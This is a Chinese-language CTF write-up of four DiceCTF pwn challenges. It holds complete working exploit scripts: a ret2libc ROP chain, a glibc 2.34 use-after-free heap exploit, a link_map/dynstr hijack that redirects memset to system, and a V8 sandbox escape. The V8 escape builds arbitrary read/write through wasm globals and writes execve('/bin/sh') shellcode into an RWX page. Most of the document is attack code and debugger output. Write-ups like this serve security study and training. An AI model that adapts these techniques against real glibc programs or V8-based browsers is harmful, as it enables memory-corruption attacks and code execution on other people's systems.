## Pwn

### interview-opportunity

```
// file
interview-opportunity: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fdee9690f9ec56b0863f7cfe1d55b8f5a3073c40, for GNU/Linux 3.2.0, not stripped

// checksec
[*] '/tmp/interview-opportunity'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

// glibc
GLIBC 2.31-13+deb11u2
```

welcome 題，bof + ret2libc，exploit 如下：

```python
#!/usr/bin/python3

from pwn import *
import sys

# dice{0ur_f16h7_70_b347_p3rf3c7_blu3_5h4ll_c0n71nu3}
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) > 1:
    r = remote('mc.ax', 31081)
else:
    r = process('./interview-opportunity', env={"LD_PRELOAD": "./libc.so.6"})

elf = ELF('./interview-opportunity')

rop_pop_rdi_ret = 0x401313
rop_ret = 0x40101a
plt_puts = elf.plt['puts']
got_puts = elf.got['puts']
main = 0x401240

rop = b'A'*34
rop += flat(
    rop_pop_rdi_ret, got_puts,
    plt_puts, main,
)
r.send(rop)
r.recvuntil('Hello: \n')
r.recvline()
libc = u64(r.recv(6).ljust(8, b'\x00')) - 484848
info(f"libc: {hex(libc)}")
binsh = libc + 1614162
system = libc + 298576
rop = b'A'*34 + p64(rop_pop_rdi_ret) + p64(binsh) + p64(rop_ret) + p64(system)
r.sendafter('join DiceGang?\n', rop)
r.interactive()
```



### babyrop

```
// file
./babyrop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=22e8dcbaa41a9ddd0d137d3f83de9d9eee392236, for GNU/Linux 3.2.0, not stripped

// checksec
[*] '/tmp/babyrop'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

// glibc
GLIBC 2.34-0experimental2
```

這題要考的是在 glibc 2.34 沒有 hook 的情況下該如何做 heap exploit，UAF 的漏洞容易發現而且很好利用，而我透過 `__environ` 變數取的 stack address，並且透過 `aaw()` 寫 ROP chain 到 return address 後，exploit 如下：

```python
#!/usr/bin/python3

from pwn import *
import sys

# dice{glibc_2.34_stole_my_function_pointers-but_at_least_nobody_uses_intel_CET}
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) > 1:
    r = remote('mc.ax', 31245)
else:
    r = process('./B', env={"LD_PRELOAD": "./libc.so.6"})

def read(idx):
    r.sendlineafter('enter your command: ', 'R')
    r.sendlineafter('enter your index: ', str(idx))

def free(idx):
    r.sendlineafter('enter your command: ', 'F')
    r.sendlineafter('enter your index: ', str(idx))

def write(idx, data):
    r.sendlineafter('enter your command: ', 'W')
    r.sendlineafter('enter your index: ', str(idx))
    r.sendafter('enter your string: ', data)

def create(idx, l, data):
    r.sendlineafter('enter your command: ', 'C')
    r.sendlineafter('enter your index: ', str(idx))
    r.sendlineafter('How long is your safe_string: ', str(l))
    r.sendafter('enter your string: ', data)

create(0, 0x418, 'A')
create(1, 0x18, 'A')
create(2, 0x28, 'A')
free(0)
create(0, 0x418, 'A')
read(0)
r.recvline()
libc = int(b''.join(r.recvline()[:-1].split(b' ')[1:7][::-1]), 16) - 0x1f4c41
unsortedbin = libc + 0x1f4cc0
__environ = libc + 2084544
info(f"libc: {hex(libc)}")

free(2)
free(1)
create(3, 0x28, 'flag.txt\x00')
create(4, 0x18, 'A') # str of 4 is 2

def aar(addr):
    write(4, p64(0x8) + p64(addr))
    read(2)
    r.recvline()
    return int(b''.join(r.recvline()[:-1].split(b' ')[::-1]), 16)

def aaw(addr, data):
    write(4, p64(len(data)) + p64(addr))
    write(2, data)

heap = aar(unsortedbin) - 0x1b80
flag_addr = heap + 7008
info(f"heap: {hex(heap)}")
stack = aar(__environ)
ret_addr = stack - 320
info(f"stack: {hex(stack)}")

rop_pop_rdi_ret = libc + 0x2d7dd
rop_pop_rsi_ret = libc + 0x2eef9
rop_pop_rdx_ret = libc + 0xd9c2d
libc_read = libc + 0xfdc80
libc_open = libc + 0xfd990
libc_write = libc + 0xfdd20
rop = flat(
   rop_pop_rdi_ret, flag_addr,
   rop_pop_rsi_ret, 0,
   rop_pop_rdx_ret, 0,
   libc_open,

   rop_pop_rdi_ret, 3,
   rop_pop_rsi_ret, flag_addr,
   rop_pop_rdx_ret, 0x60,
   libc_read,

   rop_pop_rdi_ret, 1,
   libc_write,
)
aaw(ret_addr, rop)
r.sendlineafter('enter your command: ', 'E')
r.sendlineafter('enter your index: ', str(0))
r.interactive()
```



### data-eater

```
// file
dataeater: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a3e6d6f42869e6785a5d3815426a76137ac581e1, not stripped

// checksec
[*] '/tmp/dataeater'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



這題的預期解是利用篡改 stack 殘留的 link_map，首先看整個 [link_map](https://elixir.bootlin.com/glibc/glibc-2.31/source/include/link.h#L91) 結構：

```c
// Structure describing a loaded shared object
struct link_map
{
    ElfW(Addr) l_addr; // 開啟 PIE 時，file offset 與載入位址的差
    char *l_name; // object name ptr
    ElfW(Dyn) *l_ld; // ld_section (.dynamic section 的位址)
    struct link_map *l_next, *l_prev; // double linked list
    
    // --當有不同 userspace 時會使用到--
    struct link_map *l_real;
    Lmid_t l_ns;
    // ------------------------------

    struct libname_list *l_libname; // 不重要
    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM
		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];
    const ElfW(Phdr) *l_phdr; // program header 開頭
    ElfW(Addr) l_entry;	 // ep - 也就是 _start 的位址
	...
}
```

- 最重要的部分為 member `l_info`，相關 index 的定義在 [elf.h](https://elixir.bootlin.com/glibc/glibc-2.31/source/elf/elf.h#L852)

而在這題中，我們要利用的是更改 dystr，以下為相關的結構與 macro：

```c
#define DT_STRTAB	5		/* Address of string table */

#ifdef DL_RO_DYN_SECTION
# define D_PTR(map, i) ((map)->i->d_un.d_ptr + (map)->l_addr)
#else
# define D_PTR(map, i) (map)->i->d_un.d_ptr
#endif

typedef struct
{
  Elf64_Sxword	d_tag;			/* Dynamic entry type */
  union
    {
      Elf64_Xword d_val;		/* Integer value */
      Elf64_Addr d_ptr;			/* Address value */
    } d_un;
} Elf64_Dyn;
```

因為在動態連結呼叫 `_dl_fixup()` 時 ([src](https://elixir.bootlin.com/glibc/glibc-2.31/source/elf/dl-runtime.c#L61))，會取出 strtab 對應到的 function name，直接解析成對應的 function address，如果可以竄改對應的 index 指向的 string `memset\x00` 成 `system\x00`，就可以在 `memset@got` 寫入 `system()` 位址，部分程式碼如下：

```c
DL_FIXUP_VALUE_TYPE
attribute_hidden __attribute((noinline)) ARCH_FIXUP_ATTRIBUTE
_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)
{
    // 取得 symbol table
    // D_PTR(l, l_info[DT_SYMTAB]) == l->l_info[DT_SYMTAB]->d_un.d_ptr
    const ElfW(Sym) *const symtab = (const void *)D_PTR(l, l_info[DT_SYMTAB]);
    // 取得 string table
    const char *strtab = (const void *)D_PTR(l, l_info[DT_STRTAB]);
	// 取得 got table
    const PLTREL *const reloc = (const void *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);
    // 從 symtab 取得要解析到的 symbol address
    const ElfW(Sym) *sym = &symtab[ELFW(R_SYM)(reloc->r_info)];
    const ElfW(Sym) *refsym = sym;
    // base + offset ==> 真正的 got table address
    void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);

    lookup_t result;
    DL_FIXUP_VALUE_TYPE value;
    if (__builtin_expect(ELFW(ST_VISIBILITY)(sym->st_other), 0) == 0)
    {
        ...
			// 如果能控制 strtab，就能控制 sym->st_name 的結果
            result = _dl_lookup_symbol_x(strtab + sym->st_name, l, &sym, l->l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL);
        ...
    }
}
```

- reloc_arg - `memset()` 傳入的是 1
- sym->st_name - `memset()` 會是 55 (0x37)
- `l->l_info[DT_SYMTAB]` 得到的結構會是 `Elf64_Dyn *`，而 `...->d_un.d_ptr` 取出的才會是 strtab 真正的位址



在 `main()` 時的內容：

```shell
pwndbg> p *(struct link_map *)0x155555555190
$8 = {
  l_addr = 0,
  l_name = 0x155555555730 "",
  l_ld = 0x600e20,
  l_next = 0x155555555740,
  l_prev = 0x0,
  l_real = 0x155555555190,
  l_ns = 0,
  l_libname = 0x155555555718,
  l_info = {0x0, 0x600e20, 0x600f00, 0x600ef0, 0x0, 0x600ea0, ...},
  l_phdr = 0x400040,
  l_entry = 4195680,
  ...
```

經過 `scanf()` 篡改後：

```shell
pwndbg> p *(struct link_map *)0x155555555190
$12 = {
  l_addr = 0,
  l_name = 0x0,
  l_ld = 0x0,
  l_next = 0x0,
  l_prev = 0x0,
  l_real = 0x0,
  l_ns = 0,
  l_libname = 0x0,
  l_info = {0x0, 0x0, 0x0, 0x0, 0x0, 0x601080 <buf>, ...},
  l_phdr = 0x400040,
  l_entry = 4195680,
  ...
```

此時 `buf` 的 0 ~ 7 對應到 `Elf64_Dyn->d_tag`，此 member 只有在一開始 dl 時才會用到，因此雖然放了一個不合法的 type `/bin/sh\x00`，不過不會出現問題；`buf` 的 8 ~ f 對應到 `Elf64_Dyn->d_ptr`，存放著指向 string table 的 pointer，因為我們可以控制這塊記憶體的，因此我們也能控制 strtab 的 pointer，讓 `memset()` symbol 對應到的 string 最後能指向我們控制到的 `system` 字串即可。最後 exploit 如下：

```python
#!/usr/bin/python3

from pwn import *
import sys

# dice{1nfin1t3_f1v3_lin3_ch4lls_f46297a09e671c6a}
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) > 1:
    r = remote('mc.ax', 31869)
else:
    r = process('./dataeater', aslr=False)

elf = ELF('./dataeater')
buf = 0x0601080
strtab = elf.section('.dynstr')
strtab_addr = 0x400380
new_strtab_addr = buf
sym__st_name_memset = elf.section('.dynstr').index(b'memset\x00') # 55, 0x37
link_map_off_in_stack = 32

r.sendline(f'%s%{link_map_off_in_stack}$s')
buf_data = b'/bin/sh\x00' + p64(buf - sym__st_name_memset + 0x10) + b'system\x00'
link_map_data = p64(0)*13 + p64(elf.sym['buf'])[:-1]
r.sendline(buf_data + b' ' + link_map_data)

r.interactive()
```



### memory hole

v8 challenge，patch 做了以下變動：

- 開起 v8 sandbox

  - `v8_enable_sandbox`, `v8_enable_sandboxed_external_pointers`, `v8_enable_sandboxed_pointers`, `v8_enable_sandbox_future`

- 新增 array 的 built-in function `setLength()`

  ```diff
  --- /dev/null
  +++ b/src/builtins/array-setlength.tq
  @@ -0,0 +1,14 @@
  +namespace array {
  +transitioning javascript builtin
  +ArrayPrototypeSetLength(
  +  js-implicit context: NativeContext, receiver: JSAny)(length: JSAny): JSAny {
  +    try {
  +      const len: Smi = Cast<Smi>(length) otherwise Pepega;
  +      const array: JSArray = Cast<JSArray>(receiver) otherwise Pepega;
  +      array.length = len;
  +    } label Pepega {
  +        Print("pepega");
  +    }
  +    return receiver;
  +}
  +}  // namespace array
  ```

- 避免一些 misc solution 做的 patch

  - 註解掉 `Shell::AddOSMethods` 內的一些 function，像是 `system` 以及 `rmdir`
  - 註解掉 `Shell::CreateGlobalTemplate` 內的一些 object template，如 `read` 以及 `print`
  - 註解掉 `Shell::CreateD8Template(Isolate* isolate)` 內的一些 `d8_template` data

使用 `%DebugPrint()` 稍微測試一下 `array.setLength()`，很快就能發現他可以讓使用者任意更改 `length` 欄位，而在長度超過原本的陣列大小時，存取 element 就會存取到後方的資料，因此有很明顯的 **OOB** 可以使用。

再透過 `%DebugPrint()` 來 debug 時，你可能會注意到 `JSArray` 以及 `TypeArray` 都會紀錄大小，實際在 v8 當中會先由 `JSArray` object 紀錄 array 的基本資訊，而在根據不同種類的 `TypeArray`，會再有各自的 object 來描述對應 `TypeArray` 所需要的資訊。其中 array 的長度同時會由 `JSArray` 以及 `TypeArray` 儲存：

- `JSArray` 的 length 會紀錄在 offset 0x4 ~ 0x7，存的是目前使用的大小
- `TypeArray` 的 length 會紀錄在 offset 0x4 ~ 0x7，存的是總共的大小，可能會先分配比預期使用大小更多的空間
- 在 `JSArray` 使用的大小即將大於 `TypeArray` 擁有的空間，`TypeArray` 會再擴充更多的額外空間以應付當前與之後的情況
- 在做 **read / write** 的時候，看的是 `JSArray` 的大小，所以此題 `setLength()` 更新 `JSArray` 的 length，讓我們有任意讀 / 寫
- P.S. Array 所紀錄的大小都是 4 bytes 為一個單位，因此 1 個 double value (8 bytes) 會佔 2 個單位

下方為簡單的 `setLength()` PoC：

```js
var arr = [1.1, 2.2, 3.3];
arr.setLength(100);
```



然而，雖然有 **OOB**，由於 [V8 pointer compression](https://v8.dev/blog/pointer-compression) 的關係，大多數的資料都只存 32-bit 的 offset 而已，因此我們能存取的範圍被受限在 V8 的 heap，沒辦法做到 aar / aaw，因此我們要能找到一種 object，其 member 內存放著 raw pointer (64-bit)，並且能讓我們任意讀寫，這樣就可以透過竄改此 pointer 的值來做 aar / aaw。

- 一個 **isolate** instance 為一個獨立的執行環境，並且會有自己的一個 heap

過去，`TypeBuffer` 有一個成員叫做 `backingstore`，在我們用 index 存取 element 時會從他指向的位址來做操作，並且由於他指向的空間有可能是 **PartitionAlloc** 所分配的空間，因此必須存放的 raw pointer，過去能簡單的透過竄改他做 exploit。

- 因為 buffer 可能會需要很大的空間，有可能分配在不同的 heap region，因此才需要用 raw pointer，否則無法存取到其他 heap region

再後來，`backingstore` 被拆成 `base_pointer` 以及 `external_pointer` 兩個部分，`base_pointer` 指向的是當前 isolate 的 heap base address (higher 32 bits)，`external_pointer` 則是存放 offset (lower 32 bits)，一樣還是可以從 `base_pointer` 來 leak heap base，並且竄改兩個 pointer member 來構造 aar / aaw。

- `data_ptr = base_pointer + external_pointer`

近期 (2021/10) @saelo 提出 [V8 Virtual Memory Cage](https://docs.google.com/document/d/17IW7LKiHrG3ZrtbS-EI8dJHD8-b6vpqCXnP3g315K2w/edit#heading=h.xzptrog8pyxf)，將原本存放 heap base 的 `base_pointer` 設為 nil，把他放到 register 當中 (`r14`)，以至於無法再直接透過 OOB 讀 `base_pointer` 來 leak heap base 了，並且 `base_pointer` 以及 `external_pointer` 的 value 也被限縮在 32-bit，因此侷限了 `TypedArray` 的攻擊範圍，竄改 pointer 的方式只能讓我們得到此 heap 的 aar / aaw 而已。

- `data_ptr = js_base + (external_pointer << 8) + base_pointer`



不過這個繞法很簡單，如果我們將 `TypedArray` 的 `external_pointer` 蓋成 0，這樣 `TypedArray` 就可以存取到 `js_base` 所存放的資料，而在那邊會有 `js_base` 的值，就能得到 heap base。而在蓋寫過程中，我們順便把 `TypedArray` 的成員 `byteslength` 以及 `length ` 蓋成很大的值，這樣就能在 heap 內有 aar / aaw：

```js
var tmp = ftoi(arr[19]); // get external_pointer and other 4 bytes data
arr[19] = itof( tmp & 0xffffffff00000000n ); // overwrite external_pointer to nil
tmp = ftoi(arr[16]); // get bytes length and other 4 bytes data
arr[16] = itof( (tmp & 0xffffffff00000000n) + 0xfffffff0n ); // overwrite bytes length
tmp = ftoi(arr[17]); // get length and other 4 bytes data
arr[17] = itof( (tmp & 0xffffffffn) + 0x1ffffffe0000000000n ); // overwritelength to 0x1ffffffe

var js_base = victim[3] - 0x4000n;
info('js_base', js_base);
```

- `length` 一定要改，不過 `byteslength` 我不確定



當我們有了基本的 primitive 後，再來的目標是要找有使用到 raw pointer 的 object，這也是這題的難處。參考 @kylebot，他發現 wasm 的 object `WasmInstance` 在 offset 0x50 的地方有個 member 為 `imported_mutable_globals`，存放的是 raw heap pointer，而在 0x60 offset 存放 wasm rwx page 的 base address，這讓我們可以：

- raw heap pointer - 如果此 pointer 可以控制到 wasm 進行讀寫的地方，這樣就能夠透過竄改他做利用
- rwx page address - 如果我們有 aaw，就可以寫 shellcode 到 rwx page address，並透過呼叫對應的 wasm function 執行這些 shellcode

首先我們先了解 `imported_mutable_globals` 的用途。在 wasm 當中可以定義 global variable，並對其做相關的操作，下方為 global 變數的 setter / getter 寫法：

```wasm
(module
	(global $g (import "js" "global") (mut i64))
	
   	(func (export "getGlobal") (result i64)
        (global.get $g)
    )
    
   	(func (export "setGlobal") (param $val i64)
        (global.set $g (local.get $val))
    )
)
```

- 此模式為 wat，需要透過 `wat2wasm` 轉為 wasm 才能放到 js array 並餵入 `WebAssembly.Module()`



可以把 `imported_mutable_globals` 視為 `uint64 (*imported_mutable_globals)[]` (a pointer point to array)，在操作 global 變數時，會先 deference `imported_mutable_globals` 取得 array 位址，而後從某個地方取得要存取的 global 變數 index，在對應 index 的地方還會有一個 pointer 指向變數真正的位址。舉例來說，在上面的範例程式碼中只有一個 global `global`，如果對他做操作，實際上就是 dereference `imported_mutable_globals` 兩次 (index 為 0)。



不過我要怎麼知道 wasm instance 的位址在哪？ 我採取的方式為透過 `TypedArray` 搜尋只有 wasm 才有的 data pattern，因為在每次都是新執行環境的情況下，像 Map 以及相關資料的 32-bit offset 都會是固定的，並且不受 aslr 所影響，因此直接 brute force 搜尋 wasm 對應的 pattern，符合的就是我們 wasm instance 所在的位址。要注意的是，我並沒有很了解 V8 heap，但是不同 heap subregion 中間會用 guard page 保護 (透過 `vmmap` 得知)，並且一些 data 的起始位址會被侷限在某個 heap subregion，所以要搜的範圍其實沒有很多：

```js
for (let i = 0x081c0000/8; i < 0x08380000/8 - 3; i++) {
    // aligned wasm
    if (victim[i] == 0x0800224908206439n && victim[i+1] == 0x0800224908002249n) {
        wasm_idx = BigInt(i);
        wasm_addr = wasm_idx*8n + js_base
        info("wasm_idx", wasm_idx);
        info("wasm_addr", wasm_addr);
        aligned = true;
    }
    // not aligned wasm
    if (victim[i] >> 32n == 0x08206439n &&
        victim[i+1] == 0x0800224908002249n && victim[i+2] && 0x0800224908002249n) {
        wasm_idx = BigInt(i);
        wasm_addr = wasm_idx*8n + js_base
        info("wasm_idx", wasm_idx);
        info("wasm_addr", wasm_addr);
    }
}
```

- 因為 object 並不一定對齊 0x8，加上我的 `TypedArray` 用的是 `BigUint64Array`，所以我要額外去 handle 沒有對齊的情況
- 有發現 V8 heap 隨機的位址似乎是以數秒為一個單位做隨機，短時間內重複執行的話 heap 位址都會是相同的



有了 wasm 的位址後就能構造 aar / aaw primitive。實作方式的部分總結來說，如果我們要做到 `aar(addr)`，只需要將 `imported_mutable_globals` 寫入 `js_base`，並在 `js_base+0` 寫入 `addr`，這樣 `*imported_mutable_globals == js_base`、`*js_base == addr`，就能對我們的 target address 做讀取了，而 `aaw(addr, value)` 也使用相同的方法：

```js
function aar(addr) {
    let ret = null;
    let victim_bk = victim[0];
    victim[0] = addr;
    victim[0] = 0n;
    if (aligned) {
        let bk = victim[ wasm_idx + 10n ];
        victim[ wasm_idx + 10n ] = js_base; // set imported_mutable_globals ptr
        ret = getGlobal();
        victim[ wasm_idx + 10n ] = bk;
    } else {
        let bk1 = victim[ wasm_idx + 10n ];
        let bk2 = victim[ wasm_idx + 11n ];
        victim[ wasm_idx + 10n ] = (victim[ wasm_idx + 10n ] & 0xffffffffn) + ((js_base & 0xffffffffn) << 32n);
        victim[ wasm_idx + 11n ] = ((victim[ wasm_idx + 11n ] >> 32n) << 32n) + (js_base >> 32n);
        ret = getGlobal();
        victim[ wasm_idx + 10n ] = bk1;
        victim[ wasm_idx + 11n ] = bk2;
    }
    victim[0] = victim_bk;
    return ret;
}
```

- 10 為 `imported_mutable_globals` 的 offset (0x40)



有了 aar / aaw，再來就是寫 shellcode，除了最基本的 `sys_execve("/bin/sh", 0, 0)`，因為 wasm function 的 entry point address 受到隨機化影響，因此我多 spray 了 `nop` 以及 `jmp .-0x60` 的 instruction 在 `sys_execve` shellcode 前後，這樣可以確保 exploit 不受太多隨機化影響：

```js
/*
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx
mov rdi, 0x68732f6e69622f
mov qword ptr [rsp], rdi
mov rdi, rsp
syscall

b'H\xc7\xc0;\x00\x00\x00H1\xf6H1\xd2H\xbf/bin/sh\x00H\x89<$H\x89\xe7\x0f\x05'
*/

nop = Array(0x8).fill(0x9090909090909090n); // 0x40
shellcode = [0x480000003bc0c748n, 0x2fbf48d23148f631n, 0x480068732f6e6962n, 0x050fe78948243c89n]; // 0x20
jmp = Array(0xc).fill(0x9eeb9eeb9eeb9eebn); // 0x60
payload = nop + shellcode + jmp; // 0xc0
```



final exploit：

```js
// dice{h0p-rop-pop-y0ur-w@y-out-of-the-sandb0x}
// Utility function
// ref from: https://github.com/Kyle-Kyle/blog/blob/master/writeups/dice22_memory_hole/pwn.js
let hex = (val) => '0x' + val.toString(16);
let info = (name, value) => console.log("[*] " + name + ": " + hex(value));
function gc() {
    for (let i = 0; i < 0x10; i++) new ArrayBuffer(0x1000000);
}

// used for stable fake JSValue crafting
function js_heap_defragment() { // used for stable fake JSValue crafting
    gc();
    for (let i = 0; i < 0x1000; i++) new ArrayBuffer(0x10);
}

// for data type translation
_buf = new ArrayBuffer(0x8);
u64 = new BigUint64Array(_buf);
f64 = new Float64Array(_buf);
u32 = new Uint32Array(_buf);

function ftoi(val) {
    f64[0] = val;
    return u64[0];
}

function itof(val) {
    u64[0] = val;
    return f64[0];
}
/////////////////////////////////////////

js_heap_defragment();

var arr = [1.1, 2.2, 3.3]; // use DoubleArray so we can read ptr as float
var victim = new BigUint64Array(0x100);
arr.setLength(100);

// data_ptr = js_base + (external_pointer << 8) + base_pointer
// js_base: saved in the register
// base_pointer: null for TypedArray
// external_pointer: different
//
// we overwrite the external_pointer of victim, make victim read / write data from js_base,
// and the data around js_base has code_base and js_base, we can leak from there

var tmp = ftoi(arr[19]); // get external_pointer and other 4 bytes data
arr[19] = itof( tmp & 0xffffffff00000000n ); // overwrite external_pointer to nil
tmp = ftoi(arr[16]); // get bytes length and other 4 bytes data
arr[16] = itof( (tmp & 0xffffffff00000000n) + 0xfffffff0n ); // overwrite bytes length
tmp = ftoi(arr[17]); // get length and other 4 bytes data
arr[17] = itof( (tmp & 0xffffffffn) + 0x1ffffffe0000000000n ); // overwritelength to 0x1ffffffe

var heap = victim[2];
info('heap', heap);
var js_base = victim[3] - 0x4000n;
info('js_base', js_base);

// wasm which is used to setup aar / aaw and execute our shellcode
var global = new WebAssembly.Global({value:'i64', mutable:true}, 0n);
var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 9, 2, 96, 0, 1, 126, 96, 1, 126, 0, 2, 14, 1, 2, 106, 115, 6, 103, 108, 111, 98, 97, 108, 3, 126, 1, 3, 3, 2, 0, 1, 7, 25, 2, 9, 103, 101, 116, 71, 108, 111, 98, 97, 108, 0, 0, 9, 115, 101, 116, 71, 108, 111, 98, 97, 108, 0, 1, 10, 13, 2, 4, 0, 35, 0, 11, 6, 0, 32, 0, 36, 0, 11]);
var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module, {js: {global}});
var getGlobal = wasm_instance.exports.getGlobal;
var setGlobal = wasm_instance.exports.setGlobal;

var aligned = false;
var wasm_idx = null;
var wasm_addr = null;
var victim_idx = null;
var victim_addr = null;
var rwx = null;

// it should be in the second memory region, and data may not be aligned with 0x8
for (let i = 0x081c0000/8; i < 0x08380000/8 - 2; i++) {
    // aligned wasm
    if (victim[i] == 0x0800224908206439n && victim[i+1] == 0x0800224908002249n) {
        wasm_idx = BigInt(i);
        wasm_addr = wasm_idx*8n + js_base
        info("wasm_idx", wasm_idx);
        info("wasm_addr", wasm_addr);
        aligned = true;
    }
    // not aligned wasm
    if (victim[i] >> 32n == 0x08206439n &&
        victim[i+1] == 0x0800224908002249n && victim[i+2] && 0x0800224908002249n) {
        wasm_idx = BigInt(i);
        wasm_addr = wasm_idx*8n + js_base
        info("wasm_idx", wasm_idx);
        info("wasm_addr", wasm_addr);
    }
}

if (aligned)
    rwx = victim[ wasm_idx + 12n ];
else
    rwx = (victim[ wasm_idx + 12n ] >> 32n) + ((victim[ wasm_idx + 13n] & 0xffffffffn) << 32n);
info("rwx", rwx);

function aar(addr) {
    let ret = null;
    let victim_bk = victim[0];
    victim[0] = addr;
    victim[0] = 0n;
    if (aligned) {
        let bk = victim[ wasm_idx + 10n ];
        victim[ wasm_idx + 10n ] = js_base; // set imported_mutable_globals ptr
        ret = getGlobal();
        victim[ wasm_idx + 10n ] = bk;
    } else {
        let bk1 = victim[ wasm_idx + 10n ];
        let bk2 = victim[ wasm_idx + 11n ];
        victim[ wasm_idx + 10n ] = (victim[ wasm_idx + 10n ] & 0xffffffffn) + ((js_base & 0xffffffffn) << 32n);
        victim[ wasm_idx + 11n ] = ((victim[ wasm_idx + 11n ] >> 32n) << 32n) + (js_base >> 32n);
        ret = getGlobal();
        victim[ wasm_idx + 10n ] = bk1;
        victim[ wasm_idx + 11n ] = bk2;
    }
    victim[0] = victim_bk;
    return ret;
}

function aaw(addr, value) {
    let victim_bk = victim[0];
    victim[0] = addr;
    if (aligned) {
        let bk = victim[ wasm_idx + 10n ];
        victim[ wasm_idx + 10n ] = js_base; // set imported_mutable_globals ptr
        setGlobal(value);
        victim[ wasm_idx + 10n ] = bk;
    } else {
        let bk1 = victim[ wasm_idx + 10n ];
        let bk2 = victim[ wasm_idx + 11n ];
        victim[ wasm_idx + 10n ] = (victim[ wasm_idx + 10n ] & 0xffffffffn) + ((js_base & 0xffffffffn) << 32n);
        victim[ wasm_idx + 11n ] = ((victim[ wasm_idx + 11n ] >> 32n) << 32n) + (js_base >> 32n);
        setGlobal(value);
        victim[ wasm_idx + 10n ] = bk1;
        victim[ wasm_idx + 11n ] = bk2;
    }
    victim[0] = victim_bk;
}

nop = Array(0x8).fill(0x9090909090909090n); // 0x40
shellcode = [0x480000003bc0c748n, 0x2fbf48d23148f631n, 0x480068732f6e6962n, 0x050fe78948243c89n]; // 0x20
jmp = Array(0xc).fill(0x9eeb9eeb9eeb9eebn); // 0x60
payload = nop.concat(shellcode, jmp);

for (let i = 168n, j = 0; i < 192n; i++, j++)
    aaw(rwx + i*8n, payload[j]);
aar(0n);
```

---



另一個作法則是，當透過 `%DebugPrint()` 去看某個 function object 的 attribute 時，會發現：

```
DebugPrint: 0x326208048835: [Function]
 ...
 - prototype: 0x3262081c31b1 <JSFunction (sfi = 0x326208146291)>
 ...
 - context: 0x3262081d293d <ScriptContext[5]>
 - code: 0x326200004f01 <Code BUILTIN CompileLazy>
```

有一個 `code` member，此時在用 `%DebugPrintPtr()` 將印處此 member 的相關訊息，能得到：

```
%DebugPrintPtr(0x326200004f01)
DebugPrint: 0x326200004f01: [Code]
 - map: 0x32620800263d <Map>
 - code_data_container: 0x3262080035c1 <Other heap object (CODE_DATA_CONTAINER_TYPE)>
 - builtin_id: CompileLazy
kind = BUILTIN
name = CompileLazy
compiler = turbofan
address = 0x326200004f01

Trampoline (size = 16)
0x326200004f40     0  49bac0d6e80762320000 REX.W movq r10,0x326207e8d6c0  (CompileLazy)
0x326200004f4a     a  41ffe2               jmp r10
0x326200004f4d     d  cc                   int3l
0x326200004f4e     e  cc                   int3l
0x326200004f4f     f  cc                   int3l

Instructions (size = 1112)
0x326207e8d6c0     0  55                   push rbp
0x326207e8d6c1     1  4889e5               REX.W movq rbp,rsp
0x326207e8d6c4     4  6a1e                 push 0x1e
0x326207e8d6c6     6  4883ec20             REX.W subq rsp,0x20
...
```

由此可知 Code object 紀錄 function 實際要執行的 instruction 的相關訊息，而如果將 `JSFunction` 的 code object pointer 改成 `0x414141` (與 base address 的 offset)，在呼叫 function 時會 trigger segmentation fault：

```
0xdea07e8206b    test   dword ptr [rcx + 0x1b], 0x20000000
0xdea07e82072    jne    0xdea07e82081                 <0xdea07e82081>

0xdea07e82078    add    rcx, 0x3f
0xdea07e8207c    jmp    0xdea07e8208c                 <0xdea07e8208c>
↓
0xdea07e8208c    jmp    rcx
```

觀察 asm 可以發現在後來會跳到 rcx+0x3f 上面去執行，然而 rcx 的 value 會是 `0xdea00414141`，也就是 code object 的位址，至此我們已經知道如果蓋寫 `JSFunction` 的成員 `code`，就可以控制程式的執行流程了。

透過 Turbofan JITer 產生的 instruction 會長得像：

```
pwndbg> x/5i 0xf63000440b2
   0xf63000440b2:       movabs r10,0x9090582f62696e
   0xf63000440bc:       vmovq  xmm0,r10
   0xf63000440c1:       vmovsd QWORD PTR [rcx+0xf],xmm0
   0xf63000440c6:       movabs r10,0x90905a2f736800
   0xf63000440d0:       vmovq  xmm0,r10
pwndbg> x/5i 0xf63000440b3
   0xf63000440b3:       mov    edx,0x2f62696e
   0xf63000440b8:       pop    rax
   0xf63000440b9:       nop
   0xf63000440ba:       nop
   0xf63000440bb:       add    ah,al
pwndbg> x/5i 0xf63000440c7
   0xf63000440c7:       mov    edx,0x2f736800
   0xf63000440cc:       pop    rdx
   0xf63000440cd:       nop
   0xf63000440ce:       nop
   0xf63000440cf:       add    ah,al
```

- `0xf63000440b3 ` 與 `0xf63000440c7` 原本為 double value，不過在偏移後也被視為 instruction 的開頭，因此我們可以構造出任意的 shellcode
  - 最後要執行的 instruction 必須為 jmp (2 bytes)，因此一組 instructions 最多只能到 6 bytes
- `%OptimizeFunctionOnNextCall()` 可以幫助我們讓 function 更快被 JIT；而在執行此 function 前需要執行 `%PrepareFunctionForOptimization()` 來準備 function 的 FeedbackVector



